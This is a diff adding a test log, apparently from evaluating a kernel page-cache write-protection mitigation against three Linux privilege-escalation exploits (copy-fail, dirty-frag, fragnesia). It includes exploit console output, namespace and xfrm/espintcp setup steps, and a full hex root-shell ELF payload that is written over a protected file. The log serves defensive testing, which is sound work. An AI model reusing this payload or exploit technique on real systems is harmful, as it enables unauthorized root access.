@@ -1,0 +1,100 @@
+### exec/baremetal host=inawashiro 5.18.0-rc3-00056-g27ba7abe61fc kernel=sec mode=on target=sec
+### cmdline: BOOT_IMAGE=/boot/vmlinuz-pks-sec root=PARTUUID=757cd99c-7fda-4037-bcba-b7f6395f1129 ro console=ttyS0,115200 console=tty0 panic=20 pks_auto pcache_pks=on
+
+[  131.158433] EXT4-fs (loop8): mounted filesystem with ordered data mode. Quota mode: none.
+### PKS-LEAF copy-fail
+[  131.200175] bash (995): drop_caches: 3
+[  131.302455] systemd-journald[400]: /var/log/journal/2de5d325330a45b8bfbc009b98867976/user-1001.journal: Journal file uses a different sequence number ID, rotating.
+[  131.360904] pcache_pks: suppressed stray store at _copy_to_iter+0x550/0x750
+[  131.360925] pcache_pks: suppressed stray store at _copy_to_iter+0x55a/0x750
+[  131.360933] pcache_pks: suppressed stray store at _copy_to_iter+0x574/0x750
+[  131.361122] pcache_pks: unauthorized write by 'python3'[1014] at ff3615d5b0000000 (IP scatterwalk_copychunks+0x19a/0x1c0), killing task
+[  131.361145] note: python3[1014] exited with preempt_count 1
+Killed
+marker=intact
+### PKS-LEAF dirty-frag
+[  131.397692] bash (1037): drop_caches: 3
+[  131.401962] pcache_pks: suppressed stray store at _copy_to_iter+0x550/0x750
+[  131.401979] pcache_pks: suppressed stray store at _copy_to_iter+0x55a/0x750
+[  131.401987] pcache_pks: suppressed stray store at _copy_to_iter+0x574/0x750
+[  131.402246] pcache_pks: suppressed stray store at _copy_to_iter+0x550/0x750
+[  131.402264] pcache_pks: suppressed stray store at _copy_to_iter+0x55a/0x750
+[  131.402272] pcache_pks: suppressed stray store at _copy_to_iter+0x574/0x750
+[  131.544629] pcache_pks: suppressed stray store at scatterwalk_copychunks+0x19a/0x1c0
+[  136.377400] pcache_pks_fault_callback: 63 callbacks suppressed
+[  136.377407] pcache_pks: suppressed stray store at scatterwalk_copychunks+0x19a/0x1c0
+[  136.377421] pcache_pks: suppressed stray store at scatterwalk_copychunks+0x1a0/0x1c0
+[  136.528430] pcache_pks: suppressed stray store at scatterwalk_copychunks+0x19a/0x1c0
+[  136.528446] pcache_pks: suppressed stray store at scatterwalk_copychunks+0x1a0/0x1c0
+[  136.679450] pcache_pks: suppressed stray store at scatterwalk_copychunks+0x19a/0x1c0
+[  136.679467] pcache_pks: suppressed stray store at scatterwalk_copychunks+0x1a0/0x1c0
+[  136.830541] pcache_pks: suppressed stray store at scatterwalk_copychunks+0x19a/0x1c0
+[  136.830558] pcache_pks: suppressed stray store at scatterwalk_copychunks+0x1a0/0x1c0
+[  136.981691] pcache_pks: suppressed stray store at scatterwalk_copychunks+0x19a/0x1c0
+[  136.981707] pcache_pks: suppressed stray store at scatterwalk_copychunks+0x1a0/0x1c0
+[  138.794197] exp (1047) used greatest stack depth: 13096 bytes left
+dirtyfrag: target patched successfully
+marker=intact
+### PKS-LEAF fragnesia
+[  140.567784] bash (1064): drop_caches: 3
+[1;36m[*][0m uid=[1;97m1001[0m euid=[1;97m1001[0m gid=[1;97m1001[0m egid=[1;97m1001[0m
+[1;36m[*][0m mode=xfrm_espintcp_pagecache_replace collateral=after
+
+[1;36m[*][0m target=/mnt/protected/victim_file size=65580
+outer_write_open_denied=1 errno=13 (Permission denied)
+userns_setup: outer_uid=1001 outer_gid=1001 ns_uid=0 ns_gid=0
+netns_setup=1
+loopback_up=1
+xfrm_espintcp_state_add=1
+namespace_setup_complete=1
+userns_root_mapped_to_outer_user_write_open_denied=1 errno=13 (Permission denied)
+[1;36m
+[*][0m timing: rx_pre_ulp=30000us tx_pre_splice=1000us rx_post_ulp=30000us
+[1;36m[*][0m range: offset=0x0 len=192 last=0xbf enc_len=4080 splice_len=4096
+[1;36m[*][0m union: transformed=0x0-0x10ae collateral_after=0xc0-0x10ae
+[1;36m[*][0m [2mpayload=[0m[36m7f454c4602010100000000000000000002003e0001000000780040000000000040000000000000000000000000000000000000004000380001000000000000000100000005000000000000000000000000004000000000000000400000000000b800000000000000b800000000000000001000000000000031ff31f631c0b06a0f05b0690f05b0740f056a00488d0512000000504889e2488d3d1200000031f66a3b580f055445524d3d787465726d002f62696e2f7368000000000000000000[0m
+
+stream0_table_entries=256
+
+[2J[H[2K[1;36m[*][0m smashing 192 bytes into read-only page cache  changed=[1;32m0[0m  skipped=[2m0[0m  remaining=[1;33m192[0m
+[2K[2m  0000 [0m[1;33m[00][0m[2m45 [0m[2m4c [0m[2m46 [0m[2m02 [0m[2m01 [0m[2m01 [0m[2m00 [0m [2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m
+[2K[2m  0010  [0m[2m02 [0m[2m00 [0m[2m3e [0m[2m00 [0m[2m01 [0m[2m00 [0m[2m00 [0m[2m00 [0m [2m78 [0m[2m00 [0m[2m40 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m
+[2K[2m  0020  [0m[2m40 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m [2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m
+[2K[2m  0030  [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m40 [0m[2m00 [0m[2m38 [0m[2m00 [0m [2m01 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m
+[2K[2m  0040  [0m[2m01 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m05 [0m[2m00 [0m[2m00 [0m[2m00 [0m [2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m
+[2K[2m  0050  [0m[2m00 [0m[2m00 [0m[2m40 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m [2m00 [0m[2m00 [0m[2m40 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m
+[2K[2m  0060  [0m[2mb8 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m [2mb8 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m
+[2K[2m  0070  [0m[2m00 [0m[2m10 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m [2m31 [0m[2mff [0m[2m31 [0m[2mf6 [0m[2m31 [0m[2mc0 [0m[2mb0 [0m[2m6a [0m
+[2K[2m  0080  [0m[2m0f [0m[2m05 [0m[2mb0 [0m[2m69 [0m[2m0f [0m[2m05 [0m[2mb0 [0m[2m74 [0m [2m0f [0m[2m05 [0m[2m6a [0m[2m00 [0m[2m48 [0m[2m8d [0m[2m05 [0m[2m12 [0m
+[2K[2m  0090  [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m50 [0m[2m48 [0m[2m89 [0m[2me2 [0m[2m48 [0m [2m8d [0m[2m3d [0m[2m12 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m31 [0m[2mf6 [0m
+[2K[2m  00a0  [0m[2m6a [0m[2m3b [0m[2m58 [0m[2m0f [0m[2m05 [0m[2m54 [0m[2m45 [0m[2m52 [0m [2m4d [0m[2m3d [0m[2m78 [0m[2m74 [0m[2m65 [0m[2m72 [0m[2m6d [0m[2m00 [0m
+[2K[2m  00b0  [0m[2m2f [0m[2m62 [0m[2m69 [0m[2m6e [0m[2m2f [0m[2m73 [0m[2m68 [0m[2m00 [0m [2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m
+[2K  [[1;32m[0m[2m--------------------------------------------------[0m] [1;97m0[0m/[2m192[0m (0%)
+[2K[2m────────────────────────────────────────────────────────────[0m
+[16;40r[40;1H[s[?25l[1;1H[2K[1;36m[*][0m smashing 192 bytes into read-only page cache  changed=[1;32m0[0m  skipped=[2m0[0m  remaining=[1;33m192[0m
+[2K[2m  0000 [0m[1;33m[00][0m[2m45 [0m[2m4c [0m[2m46 [0m[2m02 [0m[2m01 [0m[2m01 [0m[2m00 [0m [2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m
+[2K[2m  0010  [0m[2m02 [0m[2m00 [0m[2m3e [0m[2m00 [0m[2m01 [0m[2m00 [0m[2m00 [0m[2m00 [0m [2m78 [0m[2m00 [0m[2m40 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m
+[2K[2m  0020  [0m[2m40 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m [2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m
+[2K[2m  0030  [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m40 [0m[2m00 [0m[2m38 [0m[2m00 [0m [2m01 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m
+[2K[2m  0040  [0m[2m01 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m05 [0m[2m00 [0m[2m00 [0m[2m00 [0m [2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m
+[2K[2m  0050  [0m[2m00 [0m[2m00 [0m[2m40 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m [2m00 [0m[2m00 [0m[2m40 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m
+[2K[2m  0060  [0m[2mb8 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m [2mb8 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m
+[2K[2m  0070  [0m[2m00 [0m[2m10 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m [2m31 [0m[2mff [0m[2m31 [0m[2mf6 [0m[2m31 [0m[2mc0 [0m[2mb0 [0m[2m6a [0m
+[2K[2m  0080  [0m[2m0f [0m[2m05 [0m[2mb0 [0m[2m69 [0m[2m0f [0m[2m05 [0m[2mb0 [0m[2m74 [0m [2m0f [0m[2m05 [0m[2m6a [0m[2m00 [0m[2m48 [0m[2m8d [0m[2m05 [0m[2m12 [0m
+[2K[2m  0090  [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m50 [0m[2m48 [0m[2m89 [0m[2me2 [0m[2m48 [0m [2m8d [0m[2m3d [0m[2m12 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m31 [0m[2mf6 [0m
+[2K[2m  00a0  [0m[2m6a [0m[2m3b [0m[2m58 [0m[2m0f [0m[2m05 [0m[2m54 [0m[2m45 [0m[2m52 [0m [2m4d [0m[2m3d [0m[2m78 [0m[2m74 [0m[2m65 [0m[2m72 [0m[2m6d [0m[2m00 [0m
+[2K[2m  00b0  [0m[2m2f [0m[2m62 [0m[2m69 [0m[2m6e [0m[2m2f [0m[2m73 [0m[2m68 [0m[2m00 [0m [2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m[2m00 [0m
+[2K  [[1;32m[0m[2m--------------------------------------------------[0m] [1;97m0[0m/[2m192[0m (0%)
+[2K[2m────────────────────────────────────────────────────────────[0m
+[?25h[ubyte_flip_nonce=0 stream_byte=7f
+[2mbyte_flip_packet_iv=[0m[36mcccccccc00000000[0m
+[1;36m[*][0m [1/192] +0000  [31m00[0m -> [1;32m7f[0m  xor=[36m7f[0m seq=[2m2[0m nonce=[2m0[0m
+[0m firing espintcp splice...
+sender_ns_uid=0 euid=0 prefix_send=18 splice_to_tcp=4096 file_off=0 file_off_next=4096
+receiver_ns_uid=0 euid=0 espintcp_enabled_after_queue=1
+sender_status=0 receiver_status=0
+[1;32m[-][0m fixed behavior: byte unchanged at index=0 offset=0
+[r[9999;1H[?25h
+[  140.681782] process 'exp' launched '/mnt/protected/victim_file' with NULL argv: empty string added
+marker=altered
+### exec/baremetal done
